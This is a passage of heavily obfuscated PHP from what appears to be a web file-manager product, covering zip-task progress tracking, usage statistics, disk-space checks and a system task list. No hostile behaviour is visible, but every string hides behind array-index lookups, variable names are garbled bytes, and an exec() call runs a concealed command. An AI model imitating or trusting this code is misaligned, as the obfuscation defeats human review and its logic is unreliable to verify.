$ü­æ–¤‚[$º·‚¤–·[1128]] = $âÉ¶Íâ› == $º·‚¤–·[1878] ? $º·‚¤–·[1879] : $º·‚¤–·[1880]; $ü­æ–¤‚[$º·‚¤–·[1813]] = $º·‚¤–·[12]; $ü­æ–¤‚[$º·‚¤–·[823]] = $èšæšê; $ü­æ–¤‚[$º·‚¤–·[1876]] = $º·‚¤–·[389]; $this->update(); } public function unzipAfter($Ë”ê¥Ä•) { $˜èã¿ä =& $_SERVER[óÔë„ú]; $İ“Šæ³‹ =& $this->task; $İ“Šæ³‹[$˜èã¿ä[1876]] = $˜èã¿ä[110]; $äîš§Ğ = IO::infoWithChildren($Ë”ê¥Ä•); $’–¥şÚØ = 0; $İ“Šæ³‹[$˜èã¿ä[1820]] = array($˜èã¿ä[1821] => $’–¥şÚØ + 1, $˜èã¿ä[494] => $äîš§Ğ[$˜èã¿ä[32]], $˜èã¿ä[87] => $äîš§Ğ[$˜èã¿ä[87]], $˜èã¿ä[582] => $äîš§Ğ[$˜èã¿ä[582]] ? $äîš§Ğ[$˜èã¿ä[582]] : $äîš§Ğ[$˜èã¿ä[87]]); if ($äîš§Ğ[$˜èã¿ä[33]] == $˜èã¿ä[230]) { $İ“Šæ³‹[$˜èã¿ä[1126]] = 1; } else { $İ“Šæ³‹[$˜èã¿ä[1126]] = $äîš§Ğ[$˜èã¿ä[82]][$˜èã¿ä[80]]; } $İ“Šæ³‹[$˜èã¿ä[1128]] = $˜èã¿ä[12]; $İ“Šæ³‹[$˜èã¿ä[1813]] = 0; $İ“Šæ³‹[$˜èã¿ä[1759]] = 0; $İ“Šæ³‹[$˜èã¿ä[1811]] = 0; $İ“Šæ³‹[$˜èã¿ä[1812]] = 0; $İ“Šæ³‹[$˜èã¿ä[1809]] = $˜èã¿ä[12]; $İ“Šæ³‹[$˜èã¿ä[1816]] = 0; $İ“Šæ³‹[$˜èã¿ä[823]] = $äîš§Ğ[$˜èã¿ä[79]]; $this->update(); self::log($˜èã¿ä[1881] . json_encode(array($İ“Šæ³‹, $äîš§Ğ))); } public function nameParse($í†ãˆ“) { $ŒÏÎÂÓ´ =& $_SERVER[óÔë„ú]; $çâİİ¡¦ =& $this->task; if ($çâİİ¡¦[$ŒÏÎÂÓ´[1876]] == $ŒÏÎÂÓ´[1266]) { $çâİİ¡¦[$ŒÏÎÂÓ´[1876]] = $ŒÏÎÂÓ´[389]; $çâİİ¡¦[$ŒÏÎÂÓ´[1816]] = 0; $çâİİ¡¦[$ŒÏÎÂÓ´[823]] = 0; } $ó½º‰ÜÜ = get_path_this($í†ãˆ“); if (strstr($ó½º‰ÜÜ, $ŒÏÎÂÓ´[10])) { $çâİİ¡¦[$ŒÏÎÂÓ´[1759]] += 1; $çâİİ¡¦[$ŒÏÎÂÓ´[1126]] += 1; } $çâİİ¡¦[$ŒÏÎÂÓ´[1809]] = $í†ãˆ“; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $…»º÷Ú­ =& $_SERVER[óÔë„ú]; parent::startAfter(); Hook::bind($…»º÷Ú­[1882], array($this, $…»º÷Ú­[1872])); Hook::bind($…»º÷Ú­[1874], array($this, $…»º÷Ú­[1875])); $ºİËŸË =& $this->task; $ºİËŸË[$…»º÷Ú­[1876]] = $…»º÷Ú­[1266]; if (!$ºİËŸË[$…»º÷Ú­[1647]]) { $ºİËŸË[$…»º÷Ú­[1647]] = LNG($…»º÷Ú­[1883]); } } protected function endAfter() { $İºéÜƒË =& $_SERVER[óÔë„ú]; parent::endAfter(); Hook::unbind($İºéÜƒË[1882], array($this, $İºéÜƒË[1872])); Hook::unbind($İºéÜƒË[1874], array($this, $İºéÜƒË[1875])); } public function updateAfter() { $¡¾¦ÓÕ² =& $_SERVER[óÔë„ú]; $¦ÙÂĞ“• =& $this->task; if (!$¦ÙÂĞ“•[$¡¾¦ÓÕ²[1126]] || !$¦ÙÂĞ“•[$¡¾¦ÓÕ²[823]]) { return; } if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1876]] == $¡¾¦ÓÕ²[1266]) { $Â´×¾°ù = $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1812]]; if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1813]] != $¡¾¦ÓÕ²[1266]) { $Â´×¾°ù = 0; } $æŠ´‚ùº = ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1816]] + $Â´×¾°ù) / $¦ÙÂĞ“•[$¡¾¦ÓÕ²[823]]; $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]] = $æŠ´‚ùº * 0.3; } else { if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1876]] == $¡¾¦ÓÕ²[389]) { $æŠ´‚ùº = $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1759]] / $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1126]]; $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]] = 0.3 + $æŠ´‚ùº * 0.5; } else { if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1876]] == $¡¾¦ÓÕ²[110]) { $æŠ´‚ùº = 0; if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1811]]) { $æŠ´‚ùº = $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1812]] / $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1811]]; } $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]] = 0.3 + 0.5 + $æŠ´‚ùº * 0.2; } } } if ($¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]] > 0) { $¸§Ã·ù¾ = timeFloat() - $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1762]] - $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1765]]; $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1766]] = $¸§Ã·ù¾ * (1 - $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]]) / $¦ÙÂĞ“•[$¡¾¦ÓÕ²[1760]]; } } public function copyFileStart($ÂÀ½º©ó, $ ˆöÂ´Š, $¬ú‰‚Ûè, $¼Ô°ˆëÃ, $ê“œº–Ä, $Ê×¨èª”) { $´èÖ´Ú‡ =& $_SERVER[óÔë„ú]; parent::copyFileStart($ÂÀ½º©ó, $ ˆöÂ´Š, $¬ú‰‚Ûè, $¼Ô°ˆëÃ, $ê“œº–Ä, $Ê×¨èª”); $å³ñí½ =& $this->task; if ($å³ñí½[$´èÖ´Ú‡[1876]] == $´èÖ´Ú‡[389]) { $å³ñí½[$´èÖ´Ú‡[1876]] = $´èÖ´Ú‡[110]; } $this->update(); } public function copyFileEnd($–ØóÀ¸ó, $Ê‹äÊ¶¸, $çŸè»ã…, $­õñ¯²´, $´£ê×ÜÃ, $ÚâöÕ°“) { $õßÊÈ±” =& $_SERVER[óÔë„ú]; $”ØØ•Ü =& $this->task; $”ØØ•Ü[$õßÊÈ±”[1812]] = $”ØØ•Ü[$õßÊÈ±”[1811]]; $”ØØ•Ü[$õßÊÈ±”[1816]] += $”ØØ•Ü[$õßÊÈ±”[1811]]; $”ØØ•Ü[$õßÊÈ±”[1813]] = $õßÊÈ±”[12]; $this->update(); } public function zipEvent($ñ„Ïğùµ, $¦¤¢¯±, $€åÓÓ¿’, $¢–Öì•ç) { $À¬ØöÎè =& $_SERVER[óÔë„ú]; $®íùãÄ— =& $this->task; $®íùãÄ—[$À¬ØöÎè[1809]] = get_path_this($¦¤¢¯±); $®íùãÄ—[$À¬ØöÎè[1811]] = $¢–Öì•ç; $®íùãÄ—[$À¬ØöÎè[1812]] = $€åÓÓ¿’; $®íùãÄ—[$À¬ØöÎè[1128]] = $ñ„Ïğùµ == $À¬ØöÎè[1884] ? $À¬ØöÎè[1879] : $À¬ØöÎè[1880]; $®íùãÄ—[$À¬ØöÎè[1813]] = $À¬ØöÎè[12]; $®íùãÄ—[$À¬ØöÎè[823]] = $¢–Öì•ç; $®íùãÄ—[$À¬ØöÎè[1876]] = $À¬ØöÎè[389]; $this->update(); } public function nameParse($ºœ£ô—¸) { $£³ó›á  =& $_SERVER[óÔë„ú]; $ÚÖ‰—ê =& $this->task; if ($ÚÖ‰—ê[$£³ó›á [1759]] < $ÚÖ‰—ê[$£³ó›á [1126]]) { $áÄÅÅü” = get_path_this($ºœ£ô—¸); if (strstr($áÄÅÅü”, $£³ó›á [10])) { $ÚÖ‰—ê[$£³ó›á [1759]] += 1; } } if ($ÚÖ‰—ê[$£³ó›á [1876]] == $£³ó›á [1266]) { $ÚÖ‰—ê[$£³ó›á [1876]] = $£³ó›á [389]; } $ÚÖ‰—ê[$£³ó›á [1809]] = $ºœ£ô—¸; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($µó¢ª£¹) { $ÀÈù¸Ù =& $_SERVER[óÔë„ú]; $Èœ†ì› = array($ÀÈù¸Ù[662] => array($ÀÈù¸Ù[33] => $ÀÈù¸Ù[1885], $ÀÈù¸Ù[350] => array($ÀÈù¸Ù[255], $ÀÈù¸Ù[825], $ÀÈù¸Ù[1886], $ÀÈù¸Ù[1887])), $ÀÈù¸Ù[1888] => array($ÀÈù¸Ù[33] => $ÀÈù¸Ù[1889], $ÀÈù¸Ù[350] => array($ÀÈù¸Ù[255], $ÀÈù¸Ù[823], $ÀÈù¸Ù[1890], $ÀÈù¸Ù[1891], $ÀÈù¸Ù[1892]))); if (!isset($Èœ†ì›[$µó¢ª£¹])) { return !1; } $this->optionType = $Èœ†ì›[$µó¢ª£¹][$ÀÈù¸Ù[33]]; $this->field = $Èœ†ì›[$µó¢ª£¹][$ÀÈù¸Ù[350]]; return !0; } public function listData($ôñ—†è„ = false, $»Š«‘‡Ú = "\155\x6f\144\x69\x66\171\124\x69\x6d\x65", $ÔÕ‹‰Ã¥ = false) { return parent::listData($ôñ—†è„, $»Š«‘‡Ú, $ÔÕ‹‰Ã¥); } public function trendList($Şş¦Ä•“) { $Åß’Œı =& $_SERVER[óÔë„ú]; $±å õªò = $this->listData(); if ($±å õªò) { $ç¾Î¼« = end($±å õªò); $å»ŞºÖş = date($Åß’Œı[1893], strtotime($Åß’Œı[1894])); if ($ç¾Î¼«[$Åß’Œı[255]] == $å»ŞºÖş) { return $±å õªò; } $·Æíà× = strtotime($ç¾Î¼«[$Åß’Œı[255]]); } if (!isset($·Æíà×)) { $»˜Óœ = $Şş¦Ä•“ == $Åß’Œı[662] ? $Åß’Œı[598] : $Åß’Œı[884]; $·Æíà× = Model($»˜Óœ)->min($Åß’Œı[231]); } $Şê¼¶è = $Åß’Œı[1895] . ucfirst($Şş¦Ä•“); $¾ƒ™Ğ½ß = $this->dateList($·Æíà×); foreach ($¾ƒ™Ğ½ß as $å»ŞºÖş) { $this->{$Şê¼¶è}($å»ŞºÖş); } return $this->listData(); } private function dateList($¡í¬Ê¢µ) { $Ì’Áüõ =& $_SERVER[óÔë„ú]; $¶‹²ëôÇ = $¡í¬Ê¢µ; $ñ¿Ã¼¥Û = strtotime($Ì’Áüõ[1894]); $ŒÛëÓà = array(); while ($¶‹²ëôÇ <= $ñ¿Ã¼¥Û) { $ŒÛëÓà[] = date($Ì’Áüõ[1893], $¶‹²ëôÇ); $¶‹²ëôÇ = strtotime($Ì’Áüõ[1896], $¶‹²ëôÇ); } return $ŒÛëÓà; } public function _recordUser($¶¨°«¦ä = '') { $³ä–“í =& $_SERVER[óÔë„ú]; $¼æÆÆÇò = strtotime(date($³ä–“í[1897], strtotime($¶¨°«¦ä))); $ôíó¢†÷ = strtotime(date($³ä–“í[1898], strtotime($¶¨°«¦ä))); $¢Ü¾‘ = array($³ä–“í[231] => array($³ä–“í[1076], $ôíó¢†÷)); $ª•©ÌÍ€ = Model($³ä–“í[598])->where($¢Ü¾‘)->count($³ä–“í[1758]); $¢Ü¾‘[$³ä–“í[231]] = array($³ä–“í[409], array($¼æÆÆÇò, $ôíó¢†÷)); $€Ä±•¥å = Model($³ä–“í[598])->where($¢Ü¾‘)->count($³ä–“í[1758]); $¢Ü¾‘[$³ä–“í[33]] = $³ä–“í[1899]; $Š«Æ¯ = Model($³ä–“í[1900])->where($¢Ü¾‘)->count($³ä–“í[1901]); $Ê«Úªçõ = array($³ä–“í[255] => $¶¨°«¦ä, $³ä–“í[825] => (int) $ª•©ÌÍ€, $³ä–“í[1886] => (int) $€Ä±•¥å, $³ä–“í[1887] => (int) $Š«Æ¯); return $this->insert($Ê«Úªçõ); } public function _recordStore($™«‡ëå¶ = '') { $Ã¯ìÓï =& $_SERVER[óÔë„ú]; $œè©úÌ¹ = strtotime(date($Ã¯ìÓï[1898], strtotime($™«‡ëå¶))); $ã‡É“Ë„ = array($Ã¯ìÓï[231] => array($Ã¯ìÓï[1076], $œè©úÌ¹)); $µ¹ë„‘ = Model($Ã¯ìÓï[544])->where($ã‡É“Ë„)->sum($Ã¯ìÓï[79]); $ã‡É“Ë„[$Ã¯ìÓï[485]] = 0; $Ù¿˜Ê£ = Model($Ã¯ìÓï[884])->where($ã‡É“Ë„)->sum($Ã¯ìÓï[79]); $ã‡É“Ë„[$Ã¯ìÓï[190]] = 1; $ ¸Øë„É = Model($Ã¯ìÓï[884])->where($ã‡É“Ë„)->sum($Ã¯ìÓï[79]); $ã‡É“Ë„[$Ã¯ìÓï[190]] = 2; $•««æŒ¤ = Model($Ã¯ìÓï[884])->where($ã‡É“Ë„)->sum($Ã¯ìÓï[79]); $¿ù§ôÁµ = array($Ã¯ìÓï[255] => $™«‡ëå¶, $Ã¯ìÓï[823] => (int) $Ù¿˜Ê£, $Ã¯ìÓï[1890] => (int) $µ¹ë„‘, $Ã¯ìÓï[1891] => (int) $ ¸Øë„É, $Ã¯ìÓï[1892] => (int) $•««æŒ¤); return $this->insert($¿ù§ôÁµ); } public function trend($ç ¨±Ä”, $ŞÌ‘»ô») { $¬³ğäÏš =& $_SERVER[óÔë„ú]; if (!$this->init($ç ¨±Ä”)) { return !1; } $Ù·”Ù•¯ = $this->trendList($ç ¨±Ä”); if ($Ù·”Ù•¯ && $ŞÌ‘»ô» != $¬³ğäÏš[1731]) { $ö´õŠú´ = $Ù·”Ù•¯[0][$¬³ğäÏš[255]]; $¬ë§¡ç‹ = $this->validDate($ŞÌ‘»ô», $ö´õŠú´); $ó„½ìÙ = array(); $ÅÛÏ³ğ = array_to_keyvalue($Ù·”Ù•¯, $¬³ğäÏš[255]); foreach ($¬ë§¡ç‹ as $§¹Ú’½·) { if (isset($ÅÛÏ³ğ[$§¹Ú’½·])) { $Ä£´âÂà = $ÅÛÏ³ğ[$§¹Ú’½·]; } else { $Ä£´âÂà = end($Ù·”Ù•¯); $Ä£´âÂà[$¬³ğäÏš[255]] = $§¹Ú’½·; if ($ç ¨±Ä” == $¬³ğäÏš[662]) { $Ä£´âÂà[$¬³ğäÏš[1886]] = $Ä£´âÂà[$¬³ğäÏš[1887]] = 0; } } $ó„½ìÙ[] = $Ä£´âÂà; } $Ù·”Ù•¯ = $ó„½ìÙ; } $¦Àá†³³ = array($¬³ğäÏš[662] => array($¬³ğäÏš[825] => LNG($¬³ğäÏš[1902]), $¬³ğäÏš[1886] => LNG($¬³ğäÏš[1903]), $¬³ğäÏš[1887] => LNG($¬³ğäÏš[1904])), $¬³ğäÏš[1888] => array($¬³ğäÏš[823] => LNG($¬³ğäÏš[1905]), $¬³ğäÏš[1890] => LNG($¬³ğäÏš[1906]), $¬³ğäÏš[1891] => LNG($¬³ğäÏš[1907]), $¬³ğäÏš[1892] => LNG($¬³ğäÏš[1908]))); $ƒÉˆ·ëº = array($¬³ğäÏš[662] => $¬³ğäÏš[1909], $¬³ğäÏš[1888] => $¬³ğäÏš[79]); if (empty($Ù·”Ù•¯)) { $§¹Ú’½· = date($¬³ğäÏš[1893], strtotime($¬³ğäÏš[1894])); $„é½»× = array($¬³ğäÏš[255] => $§¹Ú’½·); foreach ($¦Àá†³³[$ç ¨±Ä”] as $£Ùèğüó => $æÛéù÷Æ) { $„é½»×[$£Ùèğüó] = 0; } $Ù·”Ù•¯[] = $„é½»×; } $Í§¡òÆÎ = array(); foreach ($Ù·”Ù•¯ as $æÛéù÷Æ) { if ($ç ¨±Ä” == $¬³ğäÏš[1888] && $æÛéù÷Æ[$¬³ğäÏš[1890]] > $æÛéù÷Æ[$¬³ğäÏš[823]]) { $æÛéù÷Æ[$¬³ğäÏš[1890]] = $æÛéù÷Æ[$¬³ğäÏš[823]]; } foreach ($¦Àá†³³[$ç ¨±Ä”] as $£Ùèğüó => $Óâ¶®¤¡) { $Ä£´âÂà = array($¬³ğäÏš[255] => $æÛéù÷Æ[$¬³ğäÏš[255]], $¬³ğäÏš[1647] => $Óâ¶®¤¡); $Ä£´âÂà[$ƒÉˆ·ëº[$ç ¨±Ä”]] = isset($æÛéù÷Æ[$£Ùèğüó]) ? $æÛéù÷Æ[$£Ùèğüó] : 0; $Í§¡òÆÎ[] = $Ä£´âÂà; } } return $Í§¡òÆÎ; } public function validDate($ğÆˆ, $ÚùäøŞ) { $ˆˆÉö’‹ =& $_SERVER[óÔë„ú]; $»âÈ²Š™ = date($ˆˆÉö’‹[1893], strtotime($ˆˆÉö’‹[1894])); $ğôáş¹  = array($»âÈ²Š™); switch ($ğÆˆ) { case $ˆˆÉö’‹[1738]: $û¨ÄĞà® = mktime(0, 0, 0, date($ˆˆÉö’‹[1910]), date($ˆˆÉö’‹[1436]) - date($ˆˆÉö’‹[1526]) + 7 - 7, date($ˆˆÉö’‹[1911])); $—¥¼¾Šô = 0; do { $ŒôùïÕö = date($ˆˆÉö’‹[1893], $û¨ÄĞà® - 3600 * 24 * 7 * $—¥¼¾Šô); $ğôáş¹ [] = $ŒôùïÕö; $—¥¼¾Šô++; } while ($ÚùäøŞ < $ŒôùïÕö); break; case $ˆˆÉö’‹[1736]: $—¥¼¾Šô = 1; do { $œ¿©•©ª = date($ˆˆÉö’‹[1912], strtotime("\55\40{$—¥¼¾Šô}\40\155\x6f\x6e\164\150\x73")); $ğôáş¹ [] = $œ¿©•©ª; $—¥¼¾Šô++; } while ($ÚùäøŞ < $œ¿©•©ª); break; case $ˆˆÉö’‹[1913]: $—‹ÀûÅ = (int) date($ˆˆÉö’‹[1911], strtotime($ÚùäøŞ)); $¦à™»§ = (int) date($ˆˆÉö’‹[1911]); if ($—‹ÀûÅ >= $¦à™»§) { break; } for ($—‹ÀûÅ; $—‹ÀûÅ < $¦à™»§; $—‹ÀûÅ++) { $ğôáş¹ [] = $—‹ÀûÅ . $ˆˆÉö’‹[1914]; } break; default: break; } if ($ÚùäøŞ > end($ğôáş¹ )) { array_pop($ğôáş¹ ); } sort($ğôáş¹ ); return $ğôáş¹ ; } public function listTable($¨®´”õ) { $ø²¹‚¬ = ucfirst($¨®´”õ); return Model($ø²¹‚¬)->listData(); } public function option($ååªŸ™‘) { $Ğ²¨¡·È = $_SERVER[óÔë„ú][1915] . ucfirst($ååªŸ™‘); return $this->{$Ğ²¨¡·È}(); } private function optionUser() { $‡­íÎÒ =& $_SERVER[óÔë„ú]; $‹í¼Å÷Õ = Model($‡­íÎÒ[598])->count($‡­íÎÒ[1758]); $‰Ì‡Çõ³ = Model($‡­íÎÒ[598])->where($‡­íÎÒ[1916])->count($‡­íÎÒ[1758]); $ÈÅ¿ = intval($GLOBALS[$‡­íÎÒ[6]][$‡­íÎÒ[425]][$‡­íÎÒ[1704]]) / 3600; $¹şù¹® = strtotime("\55{$ÈÅ¿}\x20\x68\157\x75\x72\x73"); $ÎŠà³™¸ = strtotime(date($‡­íÎÒ[1897])); if ($¹şù¹® < $ÎŠà³™¸) { $¹şù¹® = $ÎŠà³™¸; } $ŸÈÎÓÂé = array($‡­íÎÒ[1917] => array($‡­íÎÒ[1077], $¹şù¹®)); $Ÿˆ×í = (int) Model($‡­íÎÒ[598])->where($ŸÈÎÓÂé)->count($‡­íÎÒ[1758]); if (!$Ÿˆ×í) { $Ÿˆ×í = 1; } $ŸÈÎÓÂé = array($‡­íÎÒ[1917] => array($‡­íÎÒ[1077], $ÎŠà³™¸)); $è”ãßÛ„ = Model($‡­íÎÒ[598])->where($ŸÈÎÓÂé)->count($‡­íÎÒ[1758]); return array($‡­íÎÒ[818] => (int) $‹í¼Å÷Õ, $‡­íÎÒ[1918] => (int) ($‹í¼Å÷Õ - $‰Ì‡Çõ³), $‡­íÎÒ[1919] => (int) $‰Ì‡Çõ³, $‡­íÎÒ[1920] => (int) $è”ãßÛ„, $‡­íÎÒ[1921] => $Ÿˆ×í); } private function optionFile() { $ÜÇ¶¢¤¹ =& $_SERVER[óÔë„ú]; $™È¥¨öÛ = $this->sourceSize(); $÷èèÉÔÇ = $™È¥¨öÛ[$ÜÇ¶¢¤¹[79]]; $ô£ÛÛéä = $™È¥¨öÛ[$ÜÇ¶¢¤¹[1890]]; $Â¶”¦Å = Model($ÜÇ¶¢¤¹[884])->where(array($ÜÇ¶¢¤¹[485] => 0))->count($ÜÇ¶¢¤¹[193]); $´”ëªÁê = array($ÜÇ¶¢¤¹[485] => 0, $ÜÇ¶¢¤¹[231] => array($ÜÇ¶¢¤¹[1077], strtotime(date($ÜÇ¶¢¤¹[1897])))); $¹ŞÔÎğû = Model($ÜÇ¶¢¤¹[884])->where($´”ëªÁê)->sum($ÜÇ¶¢¤¹[79]); $ø€–Äú = Model($ÜÇ¶¢¤¹[884])->where($´”ëªÁê)->count($ÜÇ¶¢¤¹[193]); return array($ÜÇ¶¢¤¹[823] => $÷èèÉÔÇ, $ÜÇ¶¢¤¹[1890] => $ô£ÛÛéä, $ÜÇ¶¢¤¹[1922] => $÷èèÉÔÇ - $ô£ÛÛéä, $ÜÇ¶¢¤¹[1923] => (int) $¹ŞÔÎğû, $ÜÇ¶¢¤¹[825] => (int) $Â¶”¦Å, $ÜÇ¶¢¤¹[1924] => (int) $ø€–Äú); } private function optionAccess() { $©Œ¤Îõ =& $_SERVER[óÔë„ú]; return array($©Œ¤Îõ[818] => $this->typeLogCnt(), $©Œ¤Îõ[110] => $this->typeLogCnt($©Œ¤Îõ[110]), $©Œ¤Îõ[525] => $this->typeLogCnt($©Œ¤Îõ[525]), $©Œ¤Îõ[1925] => $this->typeLogCnt($©Œ¤Îõ[1925]), $©Œ¤Îõ[1926] => $this->typeLogCnt($©Œ¤Îõ[1926]), $©Œ¤Îõ[662] => $this->typeLogCnt($©Œ¤Îõ[12], $©Œ¤Îõ[1901])); } private function typeLogCnt($Æı…—†‡ = '', $ì€““èå = "\151\x64") { $¬›ÓĞ§Œ =& $_SERVER[óÔë„ú]; $¼Õ·Ú‹ = array($¬›ÓĞ§Œ[110] => array($¬›ÓĞ§Œ[1927], $¬›ÓĞ§Œ[1928]), $¬›ÓĞ§Œ[525] => array($¬›ÓĞ§Œ[1929], $¬›ÓĞ§Œ[1930]), $¬›ÓĞ§Œ[1925] => array($¬›ÓĞ§Œ[1931], $¬›ÓĞ§Œ[1932], $¬›ÓĞ§Œ[1933]), $¬›ÓĞ§Œ[1926] => array($¬›ÓĞ§Œ[1934], $¬›ÓĞ§Œ[1935]), $¬›ÓĞ§Œ[1936] => array($¬›ÓĞ§Œ[1937], $¬›ÓĞ§Œ[1938], $¬›ÓĞ§Œ[1939])); $Ï€öÎ° = strtotime(date($¬›ÓĞ§Œ[1897])); $ğëÓÂ·Å = array($¬›ÓĞ§Œ[231] => array($¬›ÓĞ§Œ[1077], $Ï€öÎ°)); if ($Æı…—†‡) { $ğëÓÂ·Å[$¬›ÓĞ§Œ[33]] = array($¬›ÓĞ§Œ[7], $¼Õ·Ú‹[$Æı…—†‡]); } $Íèè×É = Model($¬›ÓĞ§Œ[1900])->where($ğëÓÂ·Å)->count($ì€““èå); return (int) $Íèè×É; } private function optionServer() { $Üéú–¨³ =& $_SERVER[óÔë„ú]; $ê’õÄıç = $this->diskDriver(); $€ö‰á‰ê = KodIO::defaultDriver(); $äü¹şŠÅ = array($Üéú–¨³[877] => $€ö‰á‰ê[$Üéú–¨³[475]]); $şéÔË¿› = Model($Üéú–¨³[544])->where($äü¹şŠÅ)->sum($Üéú–¨³[79]); $›—Ìı·Ó = explode($Üéú–¨³[53], $_SERVER[$Üéú–¨³[147]]); $É§”üÅ— = $›—Ìı·Ó[0]; $„¥Â¾½î = $GLOBALS[$Üéú–¨³[6]][$Üéú–¨³[21]]; $º÷²³â = $„¥Â¾½î[$Üéú–¨³[1039]]; if ($º÷²³â == $Üéú–¨³[1027]) { $²í‡Òè‘ = explode($Üéú–¨³[1355], $„¥Â¾½î[$Üéú–¨³[1038]]); $º÷²³â = $²í‡Òè‘[0]; } if ($º÷²³â == $Üéú–¨³[975] || $º÷²³â == $Üéú–¨³[864]) { $ÇôËÔ¤ = Model()->db()->query($Üéú–¨³[1940]); $«á“÷Œ± = $ÇôËÔ¤[0] && isset($ÇôËÔ¤[0][$Üéú–¨³[1646]]) ? $ÇôËÔ¤[0][$Üéú–¨³[1646]] : 0; $º÷²³â = $Üéú–¨³[1941] . ($«á“÷Œ± ? $Üéú–¨³[8] . $«á“÷Œ± : $Üéú–¨³[12]); } $©¦ñÑŠ¦ = $GLOBALS[$Üéú–¨³[6]][$Üéú–¨³[425]][$Üéú–¨³[886]]; return array($Üéú–¨³[1942] => $ê’õÄıç ? $ê’õÄıç[$Üéú–¨³[1943]] : 0, $Üéú–¨³[1944] => $ê’õÄıç ? $ê’õÄıç[$Üéú–¨³[1945]] : 0, $Üéú–¨³[1946] => (int) $€ö‰á‰ê[$Üéú–¨³[1943]] * 1024 * 1024 * 1024, $Üéú–¨³[1947] => (int) $şéÔË¿›, $Üéú–¨³[1948] => ucfirst($É§”üÅ—), $Üéú–¨³[1949] => $Üéú–¨³[1950] . PHP_VERSION, $Üéú–¨³[1951] => phpBuild64() ? 64 : 32, $Üéú–¨³[817] => str_replace($Üéú–¨³[1196], $Üéú–¨³[1055], $º÷²³â), $Üéú–¨³[425] => ucfirst($©¦ñÑŠ¦), $Üéú–¨³[32] => $_SERVER[$Üéú–¨³[1952]]); } private function diskDriver() { $Ô›Ê›©° =& $_SERVER[óÔë„ú]; $£è×·² = $Ô›Ê›©°[8]; $è©•·Â = $GLOBALS[$Ô›Ê›©°[6]][$Ô›Ê›©°[1372]] == $Ô›Ê›©°[1373]; if ($è©•·Â) { $£è×·² = $Ô›Ê›©°[1953]; if (function_exists($Ô›Ê›©°[1954])) { exec($Ô›Ê›©°[1955], $‰æùá©…); $£è×·² = $‰æùá©…[1] . $Ô›Ê›©°[8]; } } if (!file_exists($£è×·²)) { return; } if (!function_exists($Ô›Ê›©°[1956])) { return; } $²şÉÖ÷Ò = @disk_total_space($£è×·²); $ÖÎÙÆ­¥ = $²şÉÖ÷Ò - @disk_free_space($£è×·²); return array($Ô›Ê›©°[1943] => $²şÉÖ÷Ò, $Ô›Ê›©°[1945] => $ÖÎÙÆ­¥); } public function fileChart($¶¦ıëƒç) { $¥½´Èşç =& $_SERVER[óÔë„ú]; if (isset($¶¦ıëƒç[$¥½´Èşç[1758]])) { return Model($¥½´Èşç[884])->userFileTypeProfile($¶¦ıëƒç[$¥½´Èşç[1758]]); } if (isset($¶¦ıëƒç[$¥½´Èşç[1957]])) { return Model($¥½´Èşç[884])->groupFileTypeProfile($¶¦ıëƒç[$¥½´Èşç[1957]]); } $»…²áş£ = $this->sourceSize(); $†×Ã…Í = array($¥½´Èşç[192] => 0, $¥½´Èşç[190] => 1); $˜»–çİ = Model($¥½´Èşç[884])->where($†×Ã…Í)->sum($¥½´Èşç[79]); $†×Ã…Í[$¥½´Èşç[190]] = 2; $¹àú»³ı = Model($¥½´Èşç[884])->where($†×Ã…Í)->sum($¥½´Èşç[79]); return array($¥½´Èşç[823] => $»…²áş£[$¥½´Èşç[79]], $¥½´Èşç[1890] => $»…²áş£[$¥½´Èşç[1890]], $¥½´Èşç[1891] => (int) $˜»–çİ, $¥½´Èşç[1892] => (int) $¹àú»³ı); } private function sourceSize() { $Ö„êÖší =& $_SERVER[óÔë„ú]; $òìÕØ¶å = Model($Ö„êÖší[884])->where(array($Ö„êÖší[485] => 0))->sum($Ö„êÖší[79]); $˜Ë‡øõò = Model($Ö„êÖší[544])->sum($Ö„êÖší[79]); if ($˜Ë‡øõò > $òìÕØ¶å) { $˜Ë‡øõò = $òìÕØ¶å; } return array($Ö„êÖší[79] => (int) $òìÕØ¶å, $Ö„êÖší[1890] => (int) $˜Ë‡øõò); } } goto EØƒ˜©æÚ; B‚¼Ëùøç: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x74\141\163\153\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\164\171\x70\x65", "\145\166\145\x6e\164", "\x74\x69\155\x65", "\144\145\x73\143", "\163\x79\x73\164\145\x6d", "\145\x6e\x61\142\154\x65", "\x6c\141\163\164\122\x75\156", "\163\x6f\x72\x74"); public function listData($ÙØ­Öƒ = false, $ª­·ö¦ò = "\x73\157\162\164", $®Ïæ¡û = false) { return parent::listData($ÙØ­Öƒ, $ª­·ö¦ò, $®Ïæ¡û); } public function add($Úê¤…àÅ) { $Ù®¯§á =& $_SERVER[óÔë„ú]; $Ä„¦°³Î = $this->findByName($Úê¤…àÅ[$Ù®¯§á[32]]); if ($Ä„¦°³Î) { return !1; } $Úê¤…àÅ[$Ù®¯§á[1709]] = 0; $Úê¤…àÅ[$Ù®¯§á[1981]] = $this->getSort(); return parent::insert($Úê¤…àÅ); } private function getSort() { $ªõËã¿ =& $_SERVER[óÔë„ú]; $ş½®ë¡† = parent::listData(); $ÇÃÍİí’ = array_to_keyvalue($ş½®ë¡†, $ªõËã¿[12], $ªõËã¿[1981]); return empty($ÇÃÍİí’) ? 0 : max($ÇÃÍİí’) + 1; } public function update($ùÂïĞÔÇ, $óÊåê) { 